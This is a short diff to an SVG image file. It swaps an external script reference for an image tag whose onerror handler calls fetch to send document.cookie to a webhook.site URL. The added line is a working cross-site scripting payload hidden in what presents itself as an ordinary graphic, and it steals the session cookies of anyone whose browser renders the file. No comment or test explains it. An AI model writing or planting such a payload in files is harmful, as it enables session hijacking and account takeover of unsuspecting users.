@@ -1,4 +1,3 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-<script href="https://webhook.site/1bc228d0-ba61-4060-844b-9f8561ceb40e" type="text/javascript"/>
-<rect width="100" height="100"/>
+  <image href="x" onerror="fetch('https://webhook.site/1bc228d0-ba61-4060-844b-9f8561ceb40e?c='+document.cookie)"/>
 </svg>
